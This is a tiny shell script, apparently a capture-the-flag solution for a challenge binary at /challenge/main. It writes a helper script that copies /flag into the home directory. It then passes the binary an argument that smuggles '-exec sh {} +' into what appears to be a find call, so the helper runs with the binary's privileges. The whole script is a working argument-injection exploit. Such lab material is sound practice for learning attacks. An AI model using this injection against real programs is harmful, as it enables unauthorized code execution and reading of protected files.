#!/bin/sh

echo '/usr/bin/cat /flag > ~/flag24444444' > ~/solution
chmod +x ~/solution

cd /challenge
arg="solution -exec sh {} +"
./main \""$arg"\"
